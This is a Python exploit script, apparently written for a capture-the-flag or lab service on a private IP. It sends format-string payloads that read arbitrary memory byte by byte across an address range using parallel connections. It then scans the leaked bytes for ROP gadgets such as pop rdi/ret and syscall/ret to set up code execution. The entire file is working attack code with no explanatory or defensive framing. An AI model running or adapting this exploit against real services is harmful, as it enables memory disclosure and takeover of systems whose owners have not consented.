#!/usr/bin/env python3
import concurrent.futures
import socket
import struct
import sys
import time

HOST = "10.112.0.12"
PORT = int(sys.argv[1])
START = int(sys.argv[2], 0)
END = int(sys.argv[3], 0)


def recv_until(sock, marker, timeout=2.0):
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def read_byte(address):
    for _ in range(3):
        try:
            with socket.create_connection((HOST, PORT), timeout=2.0) as sock:
                recv_until(sock, b"Codename:\n")
                fmt = b"%14$.1sEND"
                payload = fmt + b"\x00" + b"A" * (64 - len(fmt) - 1)
                payload += struct.pack("<Q", address) + b"\n"
                sock.sendall(payload)
                output = recv_until(sock, b"Packet length:\n")
                start = output.find(b"AUDIT: ")
                end = output.find(b"END", start + 7)
                if start >= 0 and end >= 0:
                    value = output[start + 7:end]
                    return address, value[0] if value else 0
        except OSError:
            time.sleep(0.05)
    return address, None

addresses = list(range(START, END))
with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
    results = list(pool.map(read_byte, addresses))

blob = bytearray()
missing = []
for address, value in results:
    if value is None:
        missing.append(address)
        blob.append(0)
    else:
        blob.append(value)

print(f"range={hex(START)}..{hex(END)} length={len(blob)} missing={len(missing)}")
print(blob.hex())
patterns = {
    "pop_rdi_ret": b"\x5f\xc3",
    "pop_rsi_ret": b"\x5e\xc3",
    "pop_rdx_ret": b"\x5a\xc3",
    "pop_rax_ret": b"\x58\xc3",
    "syscall_ret": b"\x0f\x05\xc3",
    "pop_rbp_ret": b"\x5d\xc3",
    "leave_ret": b"\xc9\xc3",
}
for name, pattern in patterns.items():
    offset = 0
    while True:
        index = blob.find(pattern, offset)
        if index < 0:
            break
        print(name, hex(START + index))
        offset = index + 1
if missing:
    print("missing_addresses", " ".join(hex(x) for x in missing[:40]))
